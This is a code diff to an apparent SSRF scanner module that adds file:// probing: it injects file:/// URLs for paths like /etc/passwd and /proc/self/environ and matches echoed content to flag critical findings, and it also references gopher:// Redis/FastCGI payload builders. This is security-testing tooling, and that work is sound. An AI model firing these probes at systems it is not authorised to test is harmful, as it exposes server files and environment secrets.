@@ -1,6 +1,7 @@
-"""Protocol modules: ``dict://``, ``ldap://``, ``tftp://`` recon + ``gopher://`` generator.
+"""Protocol modules: ``dict://``, ``ldap://``, ``tftp://``, ``file://`` recon + ``gopher://`` generator.
 
-V0.1-CRITERIA.md #5 (base: dict + gopher); v0.4 adds ldap + tftp scheme probes:
+V0.1-CRITERIA.md #5 (base: dict + gopher); v0.4 adds ldap + tftp scheme probes;
+v0.7 adds file:// SSRF detection:
 
 * :func:`gopher_payload` / :func:`resp_encode` / :func:`fastcgi_encode` -- pure
   byte encoders that build a ``gopher://`` payload (Redis RESP or FastCGI), with
@@ -19,6 +20,10 @@ V0.1-CRITERIA.md #5 (base: dict + gopher); v0.4 adds ldap + tftp scheme probes:
   sensitive files (``/etc/passwd``, ``/boot.ini``) and classify file-content
   signatures in echoed responses. Works through curl-backed SSRF sinks.
   Read-only by TFTP protocol design.
+* :func:`file_recon` (v0.7) -- inject ``file:///path`` at the SSRF injection
+  point and classify echoed responses for local-file-content signatures. If the
+  SSRF sink is curl-backed with no ``--proto`` restriction, the server reads its
+  own local filesystem. Critical-severity finding when confirmed. Read-only.
 
 R5: response bytes classified for a service banner or file content are DATA --
 substring-matched into evidence, never evaluated.
@@ -51,6 +56,11 @@ __all__ = [
     "TFTP_PROBE_FILES",
     "detect_tftp_response",
     "tftp_recon",
+    # v0.7 file://
+    "file_url",
+    "FILE_PROBE_PATHS",
+    "detect_file_response",
+    "file_recon",
 ]
 
 # --------------------------------------------------------------------------- #
@@ -449,6 +459,146 @@ async def tftp_recon(
                             "banner_signature": f"matched {', '.join(matched)}",
                         },
                         references=["https://cwe.mitre.org/data/definitions/918.html"],
+                    )
+                )
+    finally:
+        if own:
+            await client.aclose()
+    return findings
+
+
+# --------------------------------------------------------------------------- #
+# file:// scheme probes (v0.7)
+# --------------------------------------------------------------------------- #
+
+# Default set of local paths to probe via file:// SSRF.
+# Ordered from highest to lowest likelihood of finding sensitive content.
+# R5: these are literal path strings — never evaluated.
+FILE_PROBE_PATHS: tuple[str, ...] = (
+    "/etc/passwd",
+    "/etc/hosts",
+    "/proc/version",
+    "/proc/self/environ",
+    "C:/Windows/System32/drivers/etc/hosts",
+    "C:/Windows/win.ini",
+)
+
+# Per-path substring signatures (data-only). Each tuple contains substrings
+# that identify a genuine file response for that path. R5.
+_FILE_SIGNATURES: dict[str, tuple[str, ...]] = {
+    "/etc/passwd":       ("root:", "nobody:", "/bin/", "/home/", "/sbin/"),
+    "/etc/hosts":        ("localhost", "127.0.0.1", "::1", "broadcasthost"),
+    "/proc/version":     ("Linux version", "gcc version", "SMP"),
+    "/proc/self/environ":("PATH=", "HOME=", "USER=", "PWD="),
+    # Windows paths keyed exactly as passed to file_url()
+    "C:/Windows/System32/drivers/etc/hosts": ("localhost", "127.0.0.1"),
+    "C:/Windows/win.ini": ("[windows]", "[fonts]", "load=", "run="),
+}
+_FILE_MIN_HITS = 2
+
+
+def file_url(path: str) -> str:
+    """Build a ``file://`` URL for a local filesystem path.
+
+    Unix absolute paths (``/etc/passwd``) produce the three-slash
+    ``file:///etc/passwd`` form. Windows paths (``C:/Windows/win.ini``)
+    are normalised to ``file:///C:/Windows/win.ini``.
+
+    The returned URL is injected at the SSRF injection point verbatim; whether
+    the sink follows it depends on the sink's scheme restrictions. curl without
+    ``--proto`` will follow ``file://`` natively, reading the server's local FS.
+
+    Read-only: wraith performs no write via file://.
+    """
+    if not path.startswith("/"):
+        # Windows path: C:/... -> /C:/... so the URL becomes file:///C:/...
+        path = f"/{path}"
+    return f"file://{path}"
+
+
+def detect_file_response(text: str, *, path: str) -> tuple[str, ...] | None:
+    """Return matched file-content signatures from ``text``, or None if below threshold.
+
+    Looks up ``path`` in the internal signature table (falls back to
+    ``/etc/passwd`` signatures for unknown paths). At least two substrings must
+    match to avoid false positives on generic HTTP error pages.
+
+    R5: ``text`` is untrusted response content; only substring-matched, never evaluated.
+    """
+    sigs = _FILE_SIGNATURES.get(path, _FILE_SIGNATURES["/etc/passwd"])
+    matched = tuple(s for s in sigs if s in text)
+    return matched if len(matched) >= _FILE_MIN_HITS else None
+
+
+async def file_recon(
+    target,
+    scope,
+    *,
+    paths: tuple[str, ...] = ("/etc/passwd", "/etc/hosts", "/proc/version"),
+    client: ScanClient | None = None,
+    rate_limit: float | None = None,
+    proxy: str | None = None,
+    timeout: float = 10.0,
+) -> list[Finding]:
+    """``file://`` SSRF detection through an injection point (v0.7).
+
+    Injects ``file:///path`` for each entry in ``paths`` at the target's
+    marked injection point and classifies echoed responses for known
+    local-file-content signatures. If the SSRF sink is curl-backed without a
+    ``--proto`` scheme allowlist, the server reads its own filesystem and may
+    echo sensitive file content back through the injection point.
+
+    Produces a ``critical``-severity finding when a local file is confirmed:
+    arbitrary local file read via SSRF is an unambiguous critical impact.
+
+    Read-only: ``file://`` is a read-only scheme; wraith never writes.
+    Works through curl-backed SSRF sinks. Sinks with strict scheme restrictions
+    (``--proto 'https'``) return an error safely; wraith treats those as no-hit.
+    """
+    own = client is None
+    client = client or get_client(scope, rate_limit=rate_limit, proxy=proxy, timeout=timeout)
+    findings: list[Finding] = []
+    try:
+        for path in paths:
+            payload = file_url(path)
+            method, url, headers, body = target.build_request(payload)
+            try:
+                resp = await client.request(method, url, headers=headers or None, content=body)
+            except Exception:
+                continue
+            matched = detect_file_response(resp.text, path=path)
+            if matched:
+                vector = target.injection.vector()
+                # Build a stable, filesystem-safe id fragment from the path.
+                safe_id = (
+                    path.replace("/", "_").replace(":", "").replace("\\", "_").strip("_")
+                )
+                findings.append(
+                    Finding(
+                        id=f"wraith-file-{safe_id}",
+                        tool="wraith",
+                        title=f"SSRF file:// scheme reads local file {path} from the server",
+                        severity="critical",
+                        confidence="high",
+                        target=target.url,
+                        vector=vector,
+                        variant=f"file:{path}",
+                        cwe_id=CWE_SSRF,
+                        evidence={
+                            "service": "file",
+                            "injected_payload": payload,
+                            "filename": path,
+                            "banner_signature": f"matched {', '.join(matched)}",
+                            "note": (
+                                "The SSRF sink followed a file:// URL and echoed back "
+                                "local filesystem content. This proves arbitrary local "
+                                "file read on the server side via the SSRF injection point."
+                            ),
+                        },
+                        references=[
+                            "https://cwe.mitre.org/data/definitions/918.html",
+                            "https://portswigger.net/web-security/ssrf",
+                        ],
                     )
                 )
     finally:
